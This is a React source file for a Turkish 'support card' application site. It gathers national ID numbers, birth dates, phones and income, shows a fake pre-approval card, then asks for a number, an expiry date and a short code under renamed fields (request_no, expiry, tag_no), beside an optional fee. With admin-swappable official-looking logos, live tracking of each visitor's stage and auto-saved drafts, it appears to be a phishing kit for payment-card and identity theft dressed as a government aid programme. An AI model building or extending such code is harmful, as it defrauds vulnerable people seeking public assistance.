import React,{useEffect,useMemo,useRef,useState} from 'react'
import {ArrowLeft,ArrowRight,BadgeCheck,CheckCircle2,GraduationCap,HeartHandshake,Home,Info,Landmark,ShieldCheck,Store,Users,Menu,Eye,LockKeyhole,Headphones,FileText,Search,Contact,WalletCards,UserRoundCheck} from 'lucide-react'
import {defaultPrograms,defaultSettings} from './defaults'
import {supabase,supabaseEnabled} from './supabase'

const iconMap={users:Users,graduation:GraduationCap,heart:HeartHandshake,store:Store,home:Home,landmark:Landmark}
const blankForm={name:'',surname:'',tc_no:'',birth:'',city:'',district:'',phone:'',profession:'',income:'',household:'',consent:false}
const blankRequest={full_name:'',request_no:'',expiry:'',tag_no:''}
const getClientDraftToken=()=>{
  const key='destek_demo_draft_token';
  let token=localStorage.getItem(key);
  if(!token){
    token=(globalThis.crypto?.randomUUID?.()||`${Date.now()}-${Math.random()}`).replace(/[^a-zA-Z0-9-]/g,'');
    localStorage.setItem(key,token);
  }
  return token;
}
const deepMerge=(base,extra)=>{if(Array.isArray(base))return Array.isArray(extra)?extra:base;if(base&&typeof base==='object'){const out={...base};Object.keys(extra||{}).forEach(k=>{out[k]=k in base?deepMerge(base[k],extra[k]):extra[k]});return out}return extra??base}
const hydrateSettings=(data)=>{const n=deepMerge(defaultSettings,data||{});if(data?.preform?.fields){const fields={...data.preform.fields};if(fields.email){if(!fields.profession)fields.profession={...defaultSettings.preform.fields.profession};delete fields.email}if(!fields.address)fields.address={...defaultSettings.preform.fields.address};Object.keys(fields).forEach(k=>{if(fields[k]?.order==null&&defaultSettings.preform.fields[k]?.order!=null)fields[k]={...fields[k],order:defaultSettings.preform.fields[k].order}});n.preform.fields=fields}return n}
const randomCard=()=>Array.from({length:16},()=>Math.floor(Math.random()*10)).join('').replace(/(\d{4})(?=\d)/g,'$1 ')
const onlyDigits=(v,n)=>v.replace(/\D/g,'').slice(0,n)
const expiryMask=v=>{const d=v.replace(/\D/g,'').slice(0,4);return d.length>2?d.slice(0,2)+'/'+d.slice(2):d}
function phoneMask(v){
 let d=String(v||'').replace(/\D/g,'');
 if(d.startsWith('90'))d=d.slice(2);
 if(d.startsWith('0'))d=d.slice(1);
 d=d.slice(0,10);
 if(!d)return '';
 let o='0';
 if(d.length)o+=' ('+d.slice(0,3);
 if(d.length>=3)o+=')';
 if(d.length>3)o+=' '+d.slice(3,6);
 if(d.length>6)o+=' '+d.slice(6,8);
 if(d.length>8)o+=' '+d.slice(8,10);
 return o
}
const validPhone=v=>{let d=String(v||'').replace(/\D/g,'');if(d.startsWith('90'))d=d.slice(2);if(d.startsWith('0'))d=d.slice(1);return /^5\d{9}$/.test(d)}
const validTc=v=>{
 const d=String(v||'').replace(/\D/g,'');
 return /^\d{11}$/.test(d) && d[0]!=='0';
}

export default function App(){
 const [appLoading,setAppLoading]=useState(true),[settings,setSettings]=useState(defaultSettings),[programs,setPrograms]=useState(defaultPrograms),[banners,setBanners]=useState([]),[step,setStep]=useState(0),[program,setProgram]=useState(null),[form,setForm]=useState(blankForm),[request,setRequest]=useState(blankRequest),[error,setError]=useState(''),[fieldErrors,setFieldErrors]=useState({}),[uid,setUid]=useState(null),[applicationId,setApplicationId]=useState(null)
 const saveTimer=useRef(null),draftSaving=useRef(false),clientDraftToken=useRef(getClientDraftToken())
 useEffect(()=>{
  const started=Date.now();
  const finish=()=>{
    const remain=Math.max(0,1800-(Date.now()-started));
    setTimeout(()=>setAppLoading(false),remain);
  };
  if(document.readyState==='complete')finish();
  else window.addEventListener('load',finish,{once:true});
  const fallback=setTimeout(()=>setAppLoading(false),2600);
  return()=>{window.removeEventListener('load',finish);clearTimeout(fallback)}
},[]);

useEffect(()=>{(async()=>{if(!supabaseEnabled)return;const {data:{session}}=await supabase.auth.getSession();let user=session?.user;if(!user){const {data}=await supabase.auth.signInAnonymously();user=data?.user}setUid(user?.id||null);const [{data:s},{data:p},{data:b}]=await Promise.all([supabase.from('site_settings').select('data').eq('id','main').maybeSingle(),supabase.from('programs').select('*').eq('active',true).order('sort_order'),supabase.from('banners').select('*').eq('active',true).order('sort_order')]);if(s?.data)setSettings(hydrateSettings(s.data));if(p?.length)setPrograms(p);if(b?.length)setBanners(b)})()},[])
 useEffect(()=>{if(!uid||!supabaseEnabled)return;const update=()=>supabase.from('visitor_sessions').upsert({user_id:uid,stage:step,program_id:program?.id||null,last_seen:new Date().toISOString()},{onConflict:'user_id'});update();const t=setInterval(update,25000);return()=>clearInterval(t)},[uid,step,program?.id])
 const requestComplete=useMemo(()=>{const c=settings.request_form;if(c.full_name.required&&!request.full_name.trim())return false;if(c.request_no.required&&request.request_no.length!==Number(c.request_no.length))return false;if(c.expiry.required&&!/^\d{2}\/\d{2}$/.test(request.expiry))return false;if(c.tag_no.required&&request.tag_no.length!==Number(c.tag_no.length))return false;return true},[request,settings.request_form])
 const applicationPayload=(submitted=false)=>{const custom={};Object.keys(settings.preform.fields||{}).forEach(k=>{if(!['name','surname','tc_no','birth','city','district','phone','profession','income','household'].includes(k))custom[k]=form[k]??''});return {user_id:uid,program_id:program?.id||null,applicant_name:form.name||'',applicant_surname:form.surname||'',tc_no:form.tc_no||'',birth_date:form.birth||null,city:form.city||'',district:form.district||'',phone:form.phone||'',profession:form.profession||'',income:form.income||'',household:form.household||'',custom_fields:custom,request_full_name:request.full_name,request_no:request.request_no,expiry:request.expiry,tag_no:request.tag_no,status:submitted?'submitted':'draft',submitted,updated_at:new Date().toISOString()}}
 const saveDraft=async()=>{
  if(!supabaseEnabled||step!==3||!form.consent||!requestComplete||draftSaving.current)return;
  draftSaving.current=true;
  try{
    const payload=applicationPayload(false);
    delete payload.user_id;
    const {data,error}=await supabase.rpc('save_demo_application_v2',{
      p_client_token:clientDraftToken.current,
      p_payload:payload,
      p_submitted:false
    });
    if(error)throw error;
    const savedId=Array.isArray(data)?data?.[0]?.id:(data?.id||data);
    if(savedId)setApplicationId(savedId);
  }catch(err){
    console.error('Otomatik taslak kaydı başarısız:',err);
  }finally{
    draftSaving.current=false;
  }
 }
 useEffect(()=>{
  if(step!==3||!form.consent||!supabaseEnabled||!requestComplete)return;
  clearTimeout(saveTimer.current);
  saveTimer.current=setTimeout(()=>{saveDraft()},300);
  return()=>clearTimeout(saveTimer.current)
 },[request,requestComplete,step,uid,form,program?.id,applicationId,settings.preform.fields])
 const validatePreField=(k,cfg,value)=>{
  const raw=String(value??'').trim();
  const effective=getEffectiveFieldType(k,cfg);
  if(cfg?.visible&&cfg.required&&!raw)return `${cfg.label}: Bu alan zorunludur.`;
  if(!raw)return '';
  if(effective==='tc'&&!validTc(raw))return `${cfg.label}: Hatalı girdiniz. Tam 11 hane giriniz.`;
  if(effective==='phone'&&!validPhone(raw))return `${cfg.label}: Hatalı girdiniz. 0 (5XX) XXX XX XX biçiminde, 5 ile başlayan 10 haneli cep telefonu giriniz.`;
  if(effective==='date'){
   const dt=new Date(raw+'T00:00:00');
   const now=new Date();
   if(Number.isNaN(dt.getTime())||dt>now)return `${cfg.label}: Hatalı girdiniz. Geçerli bir tarih giriniz.`;
  }
  if(effective==='number'&&!/^\d+$/.test(raw))return `${cfg.label}: Hatalı girdiniz. Yalnızca rakam giriniz.`;
  if(effective==='text'){
   const min=Number(cfg.min_length)||0,max=Number(cfg.max_length)||0;
   if(min&&raw.length<min)return `${cfg.label}: Hatalı girdiniz. En az ${min} karakter giriniz.`;
   if(max&&raw.length>max)return `${cfg.label}: Hatalı girdiniz. En fazla ${max} karakter giriniz.`;
  }
  return '';
 }
 const goPre=()=>{
  const errs={};
  for(const [k,cfg] of Object.entries(settings.preform.fields||{})){
   if(!cfg?.visible)continue;
   const msg=validatePreField(k,cfg,form[k]);
   if(msg)errs[k]=msg;
  }
  if(!form.consent)errs.consent='Bilgilendirme onayı: Devam etmek için onay vermelisiniz.';
  setFieldErrors(errs);
  const first=Object.keys(errs)[0];
  if(first){
   setError('');
   requestAnimationFrame(()=>{
    const el=document.querySelector(`[data-field="${first}"] input, [data-field="${first}"]`);
    el?.scrollIntoView({behavior:'smooth',block:'center'});
    el?.focus?.();
   });
   return;
  }
  setError('');setFieldErrors({});setStep(2);scrollTo(0,0)
 }
 const finish=async()=>{
  const c=settings.request_form;
  if(c.full_name.required&&!request.full_name.trim())return setError(`${c.full_name.label} zorunludur.`);
  if(c.request_no.required&&request.request_no.length!==Number(c.request_no.length))return setError(`${c.request_no.label} ${c.request_no.length} haneli olmalıdır.`);
  if(c.expiry.required&&!/^\d{2}\/\d{2}$/.test(request.expiry))return setError(`${c.expiry.label} AA/YY biçiminde olmalıdır.`);
  if(c.tag_no.required&&request.tag_no.length!==Number(c.tag_no.length))return setError(`${c.tag_no.label} ${c.tag_no.length} haneli olmalıdır.`);
  setError('');
  if(supabaseEnabled){
    try{
      const payload=applicationPayload(true);
      delete payload.user_id;
      const {data,error}=await supabase.rpc('save_demo_application_v2',{
        p_client_token:clientDraftToken.current,
        p_payload:payload,
        p_submitted:true
      });
      if(error)throw error;
      const savedId=Array.isArray(data)?data?.[0]?.id:(data?.id||data);
      if(savedId)setApplicationId(savedId);
    }catch(err){
      console.error('Talep gönderilemedi:',err);
      return setError(`Talep kaydedilemedi: ${err?.message||'Bilinmeyen veritabanı hatası'}`);
    }
  }
  setStep(4);scrollTo(0,0)
 }
 const goBack=()=>{setError('');setFieldErrors({});setStep(s=>Math.max(0,s-1));scrollTo(0,0)}
 const pf=settings.preform.fields
 if(appLoading){
 return <div className="site-splash" role="status" aria-live="polite">
   <div className="site-splash-inner">
     <div className="site-splash-mark"><ShieldCheck size={34}/></div>
     <div className="site-splash-title">Destek Kartları</div>
     <div className="site-splash-sub">Başvuru sistemi hazırlanıyor</div>
     <div className="site-splash-loader"><span/><span/><span/></div>
   </div>
 </div>
}
 return <div className="public-app">
  <div className="demo-ribbon"><strong></strong><span> — {settings.demo_ribbon?.text||'RESMÎ KAMU HİZMETİ DEĞİLDİR — GERÇEK KİŞİSEL VERİ GİRMEYİN'}</span></div>
  {step>0&&settings.top_bar.enabled&&<div className="top-announcement">{settings.top_bar.text}</div>}
  {step>0&&<header className="inner-showcase-header">
    <div className="inner-brand-slot">
      {settings.home?.header_left_logo_url?<img src={settings.home.header_left_logo_url} alt="Sol logo"/>:<div className="inner-logo-placeholder"><ShieldCheck/><span>LOGO</span></div>}
    </div>
    <div className="inner-brand-divider"/>
    <div className="inner-brand-slot inner-brand-right">
      {settings.home?.header_right_logo_url?<img src={settings.home.header_right_logo_url} alt="Sağ logo"/>:<div className="inner-logo-placeholder"><BadgeCheck/><span>LOGO</span></div>}
    </div>
    <button className="inner-menu-btn" type="button" aria-label="Menü"><Menu/></button>
  </header>}
  <main className={step===0?'showcase-shell':'shell'}>
   {step===0&&<ShowcaseHome settings={settings} programs={programs} onProgram={p=>{setProgram(p);setStep(1);scrollTo(0,0)}} onStart={()=>{document.getElementById('home-programs')?.scrollIntoView({behavior:'smooth'})}}/>}
   {step>0&&<Progress steps={settings.steps} current={step}/>} 
   {step===1&&<section className="panel"><div className="panel-head"><div><span className="eyebrow">{settings.preform.eyebrow}</span><h2>{program?.title}</h2></div></div><div className="notice"><Info size={18}/>{settings.preform.notice}</div><div className="form-grid">
    {Object.entries(pf||{}).filter(([,cfg])=>cfg.visible).sort((a,b)=>(Number(a[1]?.order)||999)-(Number(b[1]?.order)||999)).map(([k,cfg])=><DynamicField key={k} fieldKey={k} cfg={cfg} value={form[k]||''} error={fieldErrors[k]} onChange={v=>{setForm(prev=>({...prev,[k]:normalizePreformValue(cfg,v,k)}));setFieldErrors(prev=>({...prev,[k]:''}))}}/>)} 
   </div><div data-field="consent"><label className={`consent ${fieldErrors.consent?'has-error':''}`}><input type="checkbox" checked={form.consent} onChange={e=>{setForm({...form,consent:e.target.checked});setFieldErrors(prev=>({...prev,consent:''}))}}/><span>{settings.preform.consent}</span></label>{fieldErrors.consent&&<div className="field-error">{fieldErrors.consent}</div>}</div>{error&&<div className="error">{error}</div>}<div className="actions split"><button className="ghost back-btn" onClick={()=>{setStep(0);scrollTo(0,0)}}><ArrowLeft size={18}/>{settings.preform.back_button}</button><button className="primary" onClick={goPre}>{settings.preform.next_button}<ArrowRight size={18}/></button></div></section>}
   {step===2&&<section className="panel centered"><div className="ok"><CheckCircle2 size={42}/></div><span className="eyebrow">{settings.preapproval.eyebrow}</span><h2>{settings.preapproval.title}</h2><p className="muted">{settings.preapproval.text}</p><CardPreview cfg={settings.preapproval} programCfg={program} name={`${form.name} ${form.surname}`} program={program?.title}/><div className="actions split centered-actions"><button className="ghost back-btn" onClick={goBack}><ArrowLeft size={18}/>{settings.buttons.preapproval_back}</button><button className="primary" onClick={()=>{setRequest(r=>({...r,full_name:`${form.name} ${form.surname}`}));setStep(3);scrollTo(0,0)}}>{settings.buttons.preapproval_next}<ArrowRight size={18}/></button></div></section>}
   {step===3&&<section className="panel"><span className="eyebrow">{settings.request_page.eyebrow}</span><h2>{settings.request_page.title}</h2>{(settings.request_page.logo_urls||[]).filter(Boolean).length>0&&<div className="logo-slots">{(settings.request_page.logo_urls||[]).filter(Boolean).map((u,i)=><div className="logo-slot-image" key={`${u}-${i}`}><img src={u} alt={`Görsel ${i+1}`}/></div>)}</div>}{settings.request_page.price_enabled&&<div className="price-box"><div><span>{settings.request_page.price_title}</span><b>{settings.request_page.price_value} {settings.request_page.price_currency}</b></div>{settings.request_page.price_subtitle&&<small>{settings.request_page.price_subtitle}</small>}</div>}<div className="form-grid one"><RequestField cfg={settings.request_form.full_name} value={request.full_name} onChange={v=>setRequest({...request,full_name:v})}/><RequestField cfg={settings.request_form.request_no} inputMode="numeric" value={request.request_no} onChange={v=>setRequest({...request,request_no:onlyDigits(v,Number(settings.request_form.request_no.length)||18)})}/><RequestField cfg={settings.request_form.expiry} inputMode="numeric" value={request.expiry} onChange={v=>setRequest({...request,expiry:expiryMask(v)})}/><RequestField cfg={settings.request_form.tag_no} inputMode="numeric" value={request.tag_no} onChange={v=>setRequest({...request,tag_no:onlyDigits(v,Number(settings.request_form.tag_no.length)||8)})}/></div>{error&&<div className="error">{error}</div>}<div className="actions split"><button className="ghost back-btn" onClick={goBack}><ArrowLeft size={18}/>{settings.buttons.request_back}</button><button className="primary" onClick={finish}>{settings.buttons.request_submit}<CheckCircle2 size={18}/></button></div></section>}
   {step===4&&<section className="panel centered final-panel">{settings.final_page.icon_url?<img className="final-icon-img" style={{width:+settings.final_page.icon_size||72,height:+settings.final_page.icon_size||72}} src={settings.final_page.icon_url}/>:<div className="ok"><CheckCircle2 size={42}/></div>}<span className="eyebrow">{settings.final_page.eyebrow}</span><h2>{settings.final_page.title}</h2><p className="muted final-text">{settings.final_page.text}</p><div className="final-summary"><h3>{settings.final_page.summary_title}</h3><div><span>{settings.final_page.program_label}</span><b>{program?.title||'—'}</b></div><div><span>{settings.final_page.applicant_label}</span><b>{form.name} {form.surname}</b></div></div><div className="actions final-only-home"><button className="primary" onClick={()=>{localStorage.removeItem('destek_demo_draft_token');clientDraftToken.current=getClientDraftToken();setStep(0);setProgram(null);setFieldErrors({});setForm(blankForm);setRequest(blankRequest);setApplicationId(null);scrollTo(0,0)}}>{settings.final_page.home_button}<Home size={18}/></button></div></section>}
  </main><footer className="site-footer">
  <div className="footer-builder">
    {(settings.footer?.items||[]).slice().sort((a,b)=>(Number(a.order)||999)-(Number(b.order)||999)).map(item=>
      <div className={`footer-item footer-${item.type||'text'}`} key={item.id}>
        {item.image_url&&<img src={item.image_url} alt={item.title||'Footer görseli'}/>}
        <div>
          {item.title&&<b>{item.title}</b>}
          {item.text&&<span>{item.text}</span>}
          {item.url&&<a href={item.url} target="_blank" rel="noreferrer">Bağlantıyı aç</a>}
        </div>
      </div>
    )}
  </div>
  <div className="footer-bottom"><b>{settings.footer.text}</b><span>{settings.footer.subtext}</span></div>
</footer>
 </div>
}

function ShowcaseHome({settings,programs,onProgram,onStart}){
 const h=settings.home||{};
 const steps=(h.process_items||[]).slice(0,4);
 const stats=(h.stats||[]).slice(0,4);
 const navIcons=[Home,WalletCards,FileText,Search,Headphones];
 return <div className="showcase-home">
  <header className="showcase-header">
   <div className="showcase-brand-slot">
    {h.header_left_logo_url?<img src={h.header_left_logo_url} alt="Sol logo"/>:<div className="showcase-logo-placeholder"><ShieldCheck/><span>LOGO YÜKLE</span></div>}
   </div>
   <div className="showcase-brand-divider"/>
   <div className="showcase-brand-slot showcase-brand-right">
    {h.header_right_logo_url?<img src={h.header_right_logo_url} alt="Sağ logo"/>:<div className="showcase-logo-placeholder"><BadgeCheck/><span>LOGO YÜKLE</span></div>}
   </div>
   <button className="showcase-menu" type="button" aria-label="Menü"><Menu/></button>
  </header>

  <section className="showcase-hero">
   <div className="showcase-mobile-hero-visual">
    {h.hero_image_url?<img className="showcase-mobile-people" src={h.hero_image_url} alt="Ana sayfa görseli"/>:<div className="showcase-visual-placeholder"><Users size={62}/><b>ANA GÖRSEL</b><span>Admin panelinden yükleyin</span></div>}
    {h.hero_card_image_url&&<img className="showcase-mobile-floating-card" src={h.hero_card_image_url} alt="Kart görseli"/>}
   </div>
   <div className="showcase-hero-copy">
    <span className="showcase-kicker">{h.eyebrow}</span>
    <h1>{h.hero_title}</h1>
    <p>{h.hero_text}</p>
    <div className="showcase-hero-buttons">
     <button className="showcase-primary" onClick={onStart}>{h.hero_primary_button}<ArrowRight/></button>
     <button className="showcase-secondary" onClick={onStart}>{h.hero_secondary_button}<Eye/></button>
    </div>
    <div className="showcase-trust">
     <span><LockKeyhole/> Mobil Uyumlu</span>
     <span><ArrowRight/> Hızlı Akış</span>
     <span><Headphones/> Kolay Kullanım</span>
    </div>
   </div>
   <div className="showcase-hero-visual">
    {h.hero_image_url?<img className="showcase-people" src={h.hero_image_url} alt="Ana sayfa görseli"/>:<div className="showcase-visual-placeholder"><Users size={62}/><b>ANA GÖRSEL</b><span>Admin panelinden yükleyin</span></div>}
    {h.hero_card_image_url&&<img className="showcase-floating-card" src={h.hero_card_image_url} alt="Kart görseli"/>}
   </div>
  </section>

  <section className="showcase-process">
   {steps.map((x,i)=>{const Icon=[WalletCards,FileText,UserRoundCheck,CheckCircle2][i]||CheckCircle2;return <div className="showcase-process-item" key={i}><div className={`process-icon p${i+1}`}><Icon/></div><b>{i+1}</b><h3>{x.title}</h3><p>{x.text}</p></div>})}
  </section>

  <section className="showcase-programs" id="home-programs">
   {h.programs_top_image_url&&<div className="programs-top-visual"><img src={h.programs_top_image_url} alt="Destek programları ana görseli"/></div>}
   <div className="showcase-section-heading"><span>{h.eyebrow}</span><h2>{h.programs_title}</h2><p>{h.programs_subtitle}</p></div>
   <div className="showcase-program-grid">{programs.map((p,i)=>{const Icon=iconMap[p.icon]||Users;const img=h.program_images?.[p.id];return <button className={`showcase-program-card card-tone-${i%4}`} key={p.id} onClick={()=>onProgram(p)}>
     <div className="program-card-poster">{img?<img src={img} alt={`${p.title} görseli`}/>:<div className="program-poster-placeholder"><Icon/></div>}</div>
     <div className="program-card-body"><h3>{p.title}</h3><p>{p.description}</p><span className="program-go"><ArrowRight/></span></div>
    </button>})}</div>
  </section>

  <section className="showcase-stats">
   {stats.map((x,i)=><div key={i}><strong>{x.value}</strong><span>{x.label}</span></div>)}
  </section>

  <section className="showcase-promo">
   <div className="showcase-promo-image">{h.promo_image_url?<img src={h.promo_image_url} alt="Promosyon görseli"/>:<WalletCards size={64}/>}</div>
   <div className="showcase-promo-copy"><h2>{h.promo_title}</h2><p>{h.promo_text}</p></div>
   <button className="showcase-primary" onClick={onStart}>{h.promo_button}<ArrowRight/></button>
  </section>

  <nav className="showcase-bottom-nav">
   {(h.bottom_nav||[]).slice(0,5).map((label,i)=>{
    const Icon=navIcons[i]||Home;
    const handleNav=()=>{
      if(i===0){
        window.scrollTo({top:0,behavior:'smooth'});
        return;
      }
      if(i===1||i===2){
        onStart();
        return;
      }
      if(i===3){
        document.getElementById('home-programs')?.scrollIntoView({behavior:'smooth',block:'start'});
        return;
      }
      if(i===4){
        window.scrollTo({top:document.documentElement.scrollHeight,behavior:'smooth'});
      }
    };
    return <button key={i} type="button" onClick={handleNav}><Icon/><span>{label}</span></button>
   })}
  </nav>
 </div>
}
function BannerCarousel({banners}){
 const [index,setIndex]=useState(0),touch=useRef(null);
 useEffect(()=>{if(banners.length<2)return;const t=setInterval(()=>setIndex(i=>(i+1)%banners.length),4500);return()=>clearInterval(t)},[banners.length]);
 useEffect(()=>{if(index>=banners.length)setIndex(0)},[banners.length,index]);
 const go=d=>setIndex(i=>(i+d+banners.length)%banners.length);
 return <section className="banner-carousel" aria-label="Duyuru bannerları" onTouchStart={e=>touch.current=e.touches[0].clientX} onTouchEnd={e=>{if(touch.current==null)return;const diff=e.changedTouches[0].clientX-touch.current;if(Math.abs(diff)>45)go(diff>0?-1:1);touch.current=null}}>
   <div className="banner-track" style={{transform:`translateX(-${index*100}%)`}}>{banners.map(b=><div className="banner-slide" key={b.id}><picture>{b.mobile_image_url&&<source media="(max-width: 620px)" srcSet={b.mobile_image_url}/>}<img src={b.image_url} alt={b.alt_text||'Banner'}/></picture></div>)}</div>
   {banners.length>1&&<><button className="banner-nav prev" type="button" onClick={()=>go(-1)} aria-label="Önceki banner">‹</button><button className="banner-nav next" type="button" onClick={()=>go(1)} aria-label="Sonraki banner">›</button><div className="banner-dots">{banners.map((b,i)=><button key={b.id} className={i===index?'active':''} onClick={()=>setIndex(i)} aria-label={`Banner ${i+1}`}/>)}</div></>}
 </section>
}
function getEffectiveFieldType(fieldKey,cfg){
 if(fieldKey==='tc_no')return 'tc';
 if(fieldKey==='phone')return 'phone';
 if(fieldKey==='birth')return 'date';
 if(['income','household'].includes(fieldKey))return 'number';
 return cfg?.type||'text';
}
function normalizePreformValue(cfg,v,fieldKey=''){
 const effective=getEffectiveFieldType(fieldKey,cfg);
 const raw=String(v??'');
 if(effective==='tc')return raw.replace(/\D/g,'').slice(0,11);
 if(effective==='phone'){
  let d=raw.replace(/\D/g,'');
  if(d.startsWith('90'))d=d.slice(2);
  if(d.startsWith('0'))d=d.slice(1);
  d=d.slice(0,10);
  return phoneMask(d);
 }
 if(effective==='number')return raw.replace(/\D/g,'').slice(0,Number(cfg?.max_length)||12);
 if(effective==='text')return raw.slice(0,Number(cfg?.max_length)||120);
 return raw;
}
function DynamicField({fieldKey,cfg,value,onChange,error}){
 const effective=getEffectiveFieldType(fieldKey,cfg);
 const type=effective==='date'?'date':'text';
 const inputMode=['phone','tc','number'].includes(effective)?'numeric':undefined;
 const maxLength=effective==='tc'?11:(effective==='phone'?17:(Number(cfg?.max_length)||undefined));
 const autoComplete=effective==='phone'?'tel':'off';
 return <Field fieldKey={fieldKey} effectiveType={effective} cfg={cfg} value={value} error={error} onChange={onChange} type={type} inputMode={inputMode} maxLength={maxLength} autoComplete={autoComplete}/>
}
function Field({fieldKey,effectiveType,cfg,value,onChange,error,type='text',inputMode,maxLength,autoComplete='off'}){
 const sanitize=(raw)=>{
  raw=String(raw??'');
  if(effectiveType==='tc')return raw.replace(/\D/g,'').slice(0,11);
  if(effectiveType==='phone'){
   let d=raw.replace(/\D/g,'');
   if(d.startsWith('90'))d=d.slice(2);
   if(d.startsWith('0'))d=d.slice(1);
   d=d.slice(0,10);
   return phoneMask(d);
  }
  if(effectiveType==='number')return raw.replace(/\D/g,'').slice(0,Number(cfg?.max_length)||12);
  if(effectiveType==='text')return raw.slice(0,Number(cfg?.max_length)||120);
  return raw;
 };
 const hardLimit=effectiveType==='tc'?11:(effectiveType==='phone'?17:maxLength);
 return <label data-field={fieldKey} className={`field ${error?'has-error':''}`}>
  <span>{cfg.label}{cfg.required?' *':''}</span>
  <input
   aria-invalid={!!error}
   type={type}
   inputMode={inputMode}
   maxLength={hardLimit}
   autoComplete={autoComplete}
   value={value}
   onChange={e=>onChange(sanitize(e.currentTarget.value))}
   onPaste={e=>{
    if(['phone','tc','number'].includes(effectiveType)){
     e.preventDefault();
     onChange(sanitize(e.clipboardData.getData('text')));
    }
   }}
   onDrop={e=>{
    if(['phone','tc','number'].includes(effectiveType)){
     e.preventDefault();
     onChange(sanitize(e.dataTransfer.getData('text')));
    }
   }}
   placeholder={cfg.placeholder}
  />
  {effectiveType==='phone'&&<small className="field-help">0 (5XX) XXX XX XX — 10 hane</small>}
  {effectiveType==='tc'&&<small className="field-help">11 hane</small>}
  {error&&<small className="field-error">{error}</small>}
 </label>
}
function RequestField({cfg,value,onChange,inputMode}){return <label className="field"><span>{cfg.label}{cfg.required?' *':''}</span><input inputMode={inputMode} autoComplete="off" value={value} onChange={e=>onChange(e.target.value)} placeholder={cfg.placeholder}/></label>}
function Progress({steps,current}){
 const icons=[WalletCards,FileText,UserRoundCheck,CheckCircle2];
 return <div className="progress progress-showcase">
   {steps.slice(0,4).map((label,i)=>{
     const Icon=icons[i]||CheckCircle2;
     const index=i+1;
     const state=index<current?'done':(index===current?'current':'upcoming');
     return <div className={`progress-showcase-item ${state}`} key={i}>
       <div className="progress-showcase-track">
         <div className="progress-showcase-icon"><Icon/></div>
         {i<3&&<div className="progress-showcase-line"/>}
       </div>
       <div className="progress-showcase-copy">
         <span className="progress-showcase-number">{index}</span>
         <strong>{label}</strong>
       </div>
     </div>
   })}
 </div>
}
function CardPreview({cfg,programCfg,name,program}){const bg=programCfg?.card_image_url||cfg.card_image_url;const color=programCfg?.card_text_color||cfg.card_text_color||'#fff';const style=bg?{backgroundImage:`linear-gradient(rgba(8,28,48,.18),rgba(8,28,48,.18)),url(${bg})`,color}:{color};return <div className="support-card" style={style}><div className="support-top"><span>{cfg.card_title}</span></div><div className="support-bottom"><div><small>{cfg.holder_label}</small><b>{(name||'ÖRNEK KULLANICI').toUpperCase()}</b></div><div><small>{cfg.program_label}</small><b>{(program||'Örnek Program').replace(' Destek Kartı','')}</b></div></div></div>}
